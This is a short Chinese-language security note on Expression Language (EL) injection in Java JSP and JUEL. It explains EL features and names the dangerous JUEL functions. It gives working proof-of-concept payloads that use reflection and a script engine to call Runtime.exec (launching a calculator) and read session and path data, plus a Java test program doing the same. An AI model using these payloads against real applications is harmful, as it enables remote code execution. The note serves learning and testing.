# 表达式注入

## 0x00 Introduction

>EL (表达式语言,Expression Language)，它是JSP2.0中引入的一个新内容。通过EL可以简化在JSP开发中对对象的引用，从而规范页面代码，增加程序的可读性及可维护性。EL为不熟悉Java语言页面开发的人员提供了一个开发Java Web应用的新途径。

EL表达式是JSP的内置语言。

尽管EL是JSP 2.1的一部分，但EL API已被分离到包javax.el中，并且已删除了对核心JSP类的所有依赖关系。进而引进了JUEL概念。

>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。



## 0x01 EL

EL表达式主要功能如下：

- 获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；
- 执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如${user==null}；
- 获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；
- 调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；

基本语法推荐阅读：[浅析EL表达式注入漏洞 0x02基本语法](https://xz.aliyun.com/t/7692)

## 0x02 EL注入
推荐阅读:
- [浅析EL表达式注入漏洞](https://xz.aliyun.com/t/7692)

JSP表达式外部部分或全部可控。
### 通用PoC
```java
//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}
//获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
//文件头参数
${header}
//获取webRoot
${applicationScope}
//执行命令-反射
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}
//执行命令-反射+JSEngine
${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator.app')")}

```
### JUEL危险函数

jar包：
- juel-api-2.2.7
- juel-spi-2.2.7
- juel-impl-2.2.7

危险函数：
- `javax.el.ExpressionFactory.createValueExpression()`参数传入
- `javax.el.ValueExpression.getValue()`

例子：
```java
import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

public class Test {
    public static void main(String[] args) {
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}
```


## Ref
- https://xz.aliyun.com/t/7692